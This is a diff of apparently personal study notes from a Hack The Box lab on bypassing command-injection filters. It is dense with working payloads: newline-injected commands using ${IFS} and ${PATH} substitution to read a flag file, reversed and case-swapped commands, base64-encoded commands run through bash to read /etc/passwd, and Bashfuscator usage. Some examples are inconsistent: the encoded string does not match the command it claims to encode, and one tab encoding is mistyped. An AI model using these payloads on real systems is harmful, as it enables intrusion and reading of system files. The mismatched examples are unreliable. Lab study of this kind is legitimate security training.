@@ -4,7 +4,7 @@
 
 We can see that if we try the previous operators we tested, like (`;`, `&&`, `||`), we get the error message `invalid input`:
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 &#x20;`If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF`.
 
@@ -16,7 +16,7 @@ We can see that if we try the previous operators we tested, like (`;`, `&&`, `||
 
 We know that the (`127.0.0.1`) payload does work, so let us start by adding the semi-colon (`127.0.0.1;`):
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Bypassing Space Filters and Spaces
 
@@ -176,3 +176,90 @@ Now, we need only read it -->
 ```
 ip=127.0.0.1%0a'c''a''t'${IFS}..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
 ```
+
+## Advanced Command Obfuscation
+
+### Case Manipulation
+
+```shell-session
+21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+21y4d
+## Once we replace the spaces with tabs (%09), we see that the command works perfectly
+21y4d@htb[/htb]$ $(tr%09"[A-Z]"%29"[a-z]"<<<"WhOaMi")
+### Others
+$(a="WhOaMi";printf %s "${a,,}")
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+### Reversed Commands
+
+```
+21y4d@htb[/htb]$ $(rev<<<'imaohw')
+21y4d
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+### Encoded Commands
+
+```
+## First encode the command
+echo -n 'cat /etc/passwd | grep 33' | base64
+## End Query
+bash<<<$(base64 -d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+```
+
+> Tip: Note that we are using `<<<` to avoid using a pipe `|`, which is a filtered character.
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+### Evasion Tools
+
+{% embed url="https://github.com/Bashfuscator/Bashfuscator" %}
+
+```
+eldeim@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
+eldeim@htb[/htb]$ cd Bashfuscator
+eldeim@htb[/htb]$ pip3 install setuptools==65
+eldeim@htb[/htb]$ python3 setup.py install --user
+```
+
+```
+eldeim@htb[/htb]$ cd ./bashfuscator/bin/
+eldeim@htb[/htb]$ ./bashfuscator -h
+
+usage: bashfuscator [-h] [-l] ...SNIP...
+
+optional arguments:
+  -h, --help            show this help message and exit
+
+Program Options:
+  -l, --list            List all the available obfuscators, compressors, and encoders
+  -c COMMAND, --command COMMAND
+                        Command to obfuscate
+...SNIP...
+```
+
+We can start by simply providing the command we want to obfuscate with the `-c` flag:
+
+```shell-session
+eldeim@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'
+
+[+] Mutators used: Token/ForCode -> Command/Reverse
+[+] Payload:
+ ${*/+27\[X\(} ...SNIP...  ${*~}   
+[+] Payload size: 1664 characters
+```
+
+### PoCs - Questions
+
+Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1
+
+```
+ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
+```
+
+> We need encode first the payload: `echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64` then, use the malicuos payload and add into spaces `%09`
+
